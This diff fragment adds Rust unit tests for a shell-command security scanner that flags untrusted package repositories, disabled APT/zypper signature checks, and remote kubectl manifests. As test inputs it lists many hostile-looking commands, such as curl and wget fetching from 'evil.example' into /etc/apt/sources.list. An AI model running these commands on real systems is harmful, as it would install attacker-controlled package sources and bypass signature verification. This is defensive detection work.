+        // Quoted metacharacters are data, not a shell redirection.
+        assert!(!redirect_targets_sources_list(
+            r#"curl -H "X-Note: >/etc/apt/sources.list" https://example.test/r"#,
+            ShellType::Posix,
+        ));
+    }
+
+    #[test]
+    fn test_fetch_pipeline_provenance_crosses_transformers() {
+        assert!(has(
+            "curl -fsSL https://evil.example/r.list | sed 's/stable/evil/' | doas tee /etc/apt/sources.list.d/evil.list",
+            ShellType::Posix,
+            RuleId::RepoAddFromPipe,
+        ));
+        assert!(has(
+            "wget -qO- https://evil.example/r.list | gzip -dc | awk '{print}' | tee /etc/apt/sources.list",
+            ShellType::Posix,
+            RuleId::RepoAddFromPipe,
+        ));
+        assert!(!has(
+            "curl -fsSL https://example.test/r.list | cat && printf local | tee /etc/apt/sources.list.d/local.list",
+            ShellType::Posix,
+            RuleId::RepoAddFromPipe,
+        ));
+    }
+
+    #[test]
+    fn test_downloader_output_options_targeting_sources_are_detected() {
+        for command in [
+            "curl https://evil.example/r -o /etc/apt/sources.list.d/evil.list",
+            "curl --output=/etc/apt/sources.list https://evil.example/r",
+            "curl -fsSLo/etc/apt/sources.list.d/evil.list https://evil.example/r",
+            "curl -JLo/etc/apt/sources.list.d/evil.list https://evil.example/r",
+            "curl -o /tmp/first -o /etc/apt/sources.list.d/evil.list https://evil.example/r",
+            "wget https://evil.example/r -O /etc/apt/sources.list.d/evil.list",
+            "wget --output-document=/etc/apt/sources.list https://evil.example/r",
+            "wget -qO/etc/apt/sources.list.d/evil.list https://evil.example/r",
+            "wget -nvO/etc/apt/sources.list.d/evil.list https://evil.example/r",
+            "wget -O /tmp/first -O /etc/apt/sources.list.d/evil.list https://evil.example/r",
+            "curl -O --output-dir /etc/apt/sources.list.d https://evil.example/evil.list",
+            "curl -o evil.list --output-dir /etc/apt/sources.list.d https://evil.example/r",
+            "curl -J -O --output-dir=/etc/apt/sources.list.d https://evil.example/download",
+            "wget -P /etc/apt/sources.list.d https://evil.example/evil.list",
+            "wget --directory-prefix=/etc/apt/sources.list.d https://evil.example/evil.list",
+            "curl -o /tmp/../etc/apt/sources.list.d/evil.list https://evil.example/r",
+        ] {
+            assert!(
+                has(command, ShellType::Posix, RuleId::RepoAddFromPipe),
+                "downloader output form must be recognized: {command}"
+            );
+        }
+        for command in [
+            "curl -o /tmp/repo.list https://example.test/r",
+            "curl -Hfoo/etc/apt/sources.list https://example.test/r",
+            "curl -H -o /etc/apt/sources.list https://example.test/r",
+            "wget --output-document=/tmp/repo.list https://example.test/r",
+            "wget -ologO/etc/apt/sources.list https://example.test/r",
+            "wget -o -O /etc/apt/sources.list https://example.test/r",
+        ] {
+            assert!(
+                !has(command, ShellType::Posix, RuleId::RepoAddFromPipe),
+                "an unrelated output path must remain clean: {command}"
+            );
+        }
     }
 
     #[test]
@@ -1391,6 +2100,45 @@ mod tests {
     }
 
     #[test]
+    fn test_apt_configuration_overrides_parse_all_native_forms() {
+        for command in [
+            "sudo apt-get -o APT::Get::AllowUnauthenticated=true install pkg",
+            "apt-get install -oAPT::Get::AllowUnauthenticated=1 pkg",
+            "apt --option=Acquire::AllowInsecureRepositories=yes update",
+            "apt-get -o=Acquire::AllowDowngradeToInsecureRepositories=on upgrade",
+            "apt-get -o APT::Get::AllowUnauthenticated install pkg",
+            "aptitude install --allow-unauthenticated=true pkg",
+            "apt-get --allow-insecure-repositories=1 update",
+            "apt-get --allow-downgrades-to-insecure-repositories update",
+            "apt-get --allow-\"unauthenticated\" install pkg",
+        ] {
+            assert!(
+                has(command, ShellType::Posix, RuleId::UnsignedRepoTrust),
+                "APT authentication override must be recognized: {command}"
+            );
+            assert!(
+                crate::extract::tier1_scan_for_shell(command, ScanContext::Exec, ShellType::Posix,),
+                "APT authentication override must pass the tier-1 gate: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_apt_explicit_secure_boolean_values_remain_clean() {
+        for command in [
+            "apt-get -o APT::Get::AllowUnauthenticated=false install pkg",
+            "apt-get --option=Acquire::AllowInsecureRepositories=0 update",
+            "apt install --allow-unauthenticated=off pkg",
+            "apt-get update --allow-insecure-repositories=no",
+        ] {
+            assert!(
+                !has(command, ShellType::Posix, RuleId::UnsignedRepoTrust),
+                "explicit secure APT boolean must remain clean: {command}"
+            );
+        }
+    }
+
+    #[test]
     fn test_apt_install_plain_no_fire() {
         assert!(none("sudo apt-get install nginx", ShellType::Posix));
         assert!(none("apt install build-essential", ShellType::Posix));
@@ -1418,6 +2166,30 @@ mod tests {
     fn test_yum_nogpgcheck() {
         assert!(has(
             "sudo yum install --nogpgcheck pkg",
+            ShellType::Posix,
+            RuleId::GpgCheckDisabled,
+        ));
+    }
+
+    #[test]
+    fn test_zypper_native_no_gpg_checks_before_and_after_subcommand() {
+        for command in [
+            "sudo zypper --no-gpg-checks install pkg",
+            "zypper install --no-gpg-checks pkg",
+            "zypper --no-gpg-checks=true install pkg",
+            "zypper --no-\"gpg-checks\" install pkg",
+        ] {
+            assert!(
+                has(command, ShellType::Posix, RuleId::GpgCheckDisabled),
+                "zypper native signature-disable flag must be recognized: {command}"
+            );
+            assert!(
+                crate::extract::tier1_scan_for_shell(command, ScanContext::Exec, ShellType::Posix,),
+                "zypper signature-disable flag must pass the tier-1 gate: {command}"
+            );
+        }
+        assert!(!has(
+            "zypper --no-gpg-checks=false install pkg",
             ShellType::Posix,
             RuleId::GpgCheckDisabled,
         ));
@@ -1510,6 +2282,125 @@ mod tests {
             ShellType::Posix,
             RuleId::KubectlApplyRemote,
         ));
+    }
+
+    #[test]
+    fn test_kubectl_attached_and_repeated_filename_values() {
+        for command in [
+            "kubectl apply -fhttps://raw.githubusercontent.com/x/y/main/deploy.yaml",
+            "kubectl apply -f=https://raw.githubusercontent.com/x/y/main/deploy.yaml",
+            "kubectl apply -f ./base.yaml -fhttps://example.test/overlay.yaml",
+            "kubectl apply -Rfhttps://example.test/overlay.yaml",
+            "kubectl apply -f\"https://example.test/quoted.yaml\"",
+            "kubectl apply --filename=\"https://example.test/quoted-long.yaml\"",
+            "kubectl apply -f ./local.yaml,https://example.test/second.yaml",
+            "kubectl -nprod apply --filename https://example.test/deploy.yaml",
+            r#"C:\Tools\kubectl.exe apply -fhttps://example.test/deploy.yaml"#,
+        ] {
+            let shell = if command.starts_with("C:") {
+                ShellType::Cmd
+            } else {
+                ShellType::Posix
+            };
+            assert!(
+                has(command, shell, RuleId::KubectlApplyRemote),
+                "kubectl attached/repeated filename form must be recognized: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_kubectl_remote_kustomize_all_option_forms() {
+        for command in [
+            "kubectl apply -k https://github.com/acme/manifests//prod?ref=v1",
+            "kubectl apply -khttps://github.com/acme/manifests//prod?ref=v1",
+            "kubectl apply --kustomize=https://gitlab.com/acme/manifests/-/raw/main/prod",
+            "kubectl --profile cpu apply -k github.com/acme/manifests//prod",
+            "oc --context prod apply --kustomize github.com/acme/manifests//prod",
+        ] {
+            assert!(
+                has(command, ShellType::Posix, RuleId::KubectlApplyRemote),
+                "remote kustomize source must be recognized: {command}"
+            );
+            assert!(
+                crate::extract::tier1_scan_for_shell(command, ScanContext::Exec, ShellType::Posix,),
+                "remote kustomize source must pass the tier-1 gate: {command}"
+            );
+        }
+        for command in [
+            "kubectl apply -k ./overlays/prod",
+            "kubectl apply --kustomize=../reviewed/prod",
+            "kubectl apply -f -",
+        ] {
+            assert!(
+                !has(command, ShellType::Posix, RuleId::KubectlApplyRemote),
+                "local/stdin manifest source must remain clean: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_kubectl_manifest_option_ambiguity_fails_conservatively() {
+        for command in ["kubectl apply -f", "kubectl apply --filename="] {
+            assert!(
+                has(command, ShellType::Posix, RuleId::KubectlApplyRemote),
+                "ambiguous manifest option must not return clean: {command}"
+            );
+        }
+        assert!(!has(
+            "kubectl get pods -fhttps://example.test/not-a-supported-get-flag",
+            ShellType::Posix,
+            RuleId::KubectlApplyRemote,
+        ));
+        assert!(!has(
+            "kubectl apply -f --namespace",
+            ShellType::Posix,
+            RuleId::KubectlApplyRemote,
+        ));
+        assert!(!has(
+            r#"kubectl apply --filename='"./local,comma.yaml"'"#,
+            ShellType::Posix,
+            RuleId::KubectlApplyRemote,
+        ));
+    }
+
+    #[test]
+    fn test_remediation_shapes_reach_the_rule_through_the_engine_gate() {
+        for (command, rule) in [
+            (
+                "apt-get -o APT::Get::AllowUnauthenticated=true install pkg",
+                RuleId::UnsignedRepoTrust,
+            ),
+            (
+                "apt-get --allow-downgrades-to-insecure-repositories update",
+                RuleId::UnsignedRepoTrust,
+            ),
+            (
+                "zypper --no-gpg-checks install pkg",
+                RuleId::GpgCheckDisabled,
+            ),
+            (
+                "curl https://evil.example/r | sed s/x/y/ | doas tee /etc/apt/sources.list.d/x.list",
+                RuleId::RepoAddFromPipe,
+            ),
+            (
+                "wget --output-document=/etc/apt/sources.list https://evil.example/r",
+                RuleId::RepoAddFromPipe,
+            ),
+            (
+                "kubectl apply -fhttps://example.test/deploy.yaml",
+                RuleId::KubectlApplyRemote,
+            ),
+            (
+                "oc --context prod apply --kustomize github.com/acme/manifests//prod",
+                RuleId::KubectlApplyRemote,
+            ),
+        ] {
+            assert!(
+                engine_has(command, ShellType::Posix, rule),
+                "the public engine gate must reach {rule:?} for: {command}"
+            );
+        }
     }
 
     #[test]
